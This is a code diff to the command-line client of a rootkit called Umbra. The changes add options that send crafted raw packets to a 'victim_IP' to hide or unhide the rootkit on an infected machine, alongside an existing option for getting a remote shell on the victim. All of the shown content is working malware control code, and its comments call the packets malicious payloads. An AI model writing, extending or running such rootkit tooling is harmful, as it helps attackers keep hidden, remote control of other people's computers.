@@ -26,13 +26,16 @@ void print_welcome_message(){
 }
 
 void print_help_dialog(const char* arg){
-    printf("Usage: %s [OPTION] [victim_IP]\n\n", arg);
+    printf("\nUsage: %s [OPTION] victim_IP\n\n", arg);
     printf("Program OPTIONs\n");
     char* line = "-S victim_IP";
     char* desc = "Get a remote shell to victim_IP";
     printf("\t%-50s %-50s\n\n", line, desc);
-    line = "-V hide | unhide";
-    desc = "Hide or unhide the rootkit remotely";
+    line = "-u victim_IP";
+    desc = "Unhide the rootkit remotely from the host";
+    printf("\t%-50s %-50s\n\n", line, desc);
+    line = "-i victim_IP";
+    desc = "Hide the rootkit remotely from the host";
     printf("\t%-50s %-50s\n\n", line, desc);
     line = "\nProgram options";
     printf("\t%-50s\n", line);
@@ -110,7 +113,29 @@ void get_shell(char* argv){
 }
 
 void show_rootkit(char* argv){
+    char* local_ip = getLocalIpAddress();
+    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_SHOW_ROOTKIT");
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+    }else{
+        printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
+    }
+    free(local_ip);
+}
 
+void hide_rootkit(char* argv){
+    char* local_ip = getLocalIpAddress();
+    packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_HIDE_ROOTKIT");
+    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
+    //Sending the malicious payload
+    if(rawsocket_send(packet)<0){
+        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
+    }else{
+        printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
+    }
+    free(local_ip);
 }
 
 
@@ -120,17 +145,17 @@ void main(int argc, char* argv[]){
         print_help_dialog(argv[0]);
         return;
     }
-    print_welcome_message();
-    sleep(1);
     
     
     int opt;
     char dest_address[32];
 
     //Command line argument parsing
-    while ((opt = getopt(argc, argv, ":S:V:h")) != -1) {
+    while ((opt = getopt(argc, argv, ":S:u:i:h")) != -1) {
         switch (opt) {
         case 'S':
+            print_welcome_message();
+            sleep(1);
             //Get a shell mode
             printf("["KBLU"INFO"RESET"]""Activated GET a SHELL mode\n");
             //printf("Option S has argument %s\n", optarg);
@@ -138,16 +163,26 @@ void main(int argc, char* argv[]){
             get_shell(dest_address);
             
             break;
-        case 'V': 
-            //Mode within module
-            /*printf("Option m has argument %s\n", optarg);
-            if(strcmp(optarg, "spoof")==0) mode = SPOOFED;
-            else if(strcmp(optarg, "benchmark")==0) mode = BENCHMARK;
-            else if(strcmp(optarg, "direct")==0) mode = DIRECT;
-            else{
-                fprintf(stderr, "Unrecognized mode \"%s\"\n", optarg); exit(EXIT_FAILURE);
-            } 
-            break;*/
+        case 'u': 
+            print_welcome_message();
+            sleep(1);
+            //Selecting show rootkit - Unhide mode
+            printf("["KBLU"INFO"RESET"]""Selected UNHIDE the rootkit remotely\n");
+            //printf("Option m has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            show_rootkit(dest_address);
+
+            break;
+        case 'i': 
+            print_welcome_message();
+            sleep(1);
+            //Selecting hide rootkit - Invisible mode
+            printf("["KBLU"INFO"RESET"]""Selected HIDE the rootkit remotely\n");
+            //printf("Option m has argument %s\n", optarg);
+            strcpy(dest_address, optarg);
+            hide_rootkit(dest_address);
+
+            break;
         case 'h':
             print_help_dialog(argv[0]);
             exit(0);
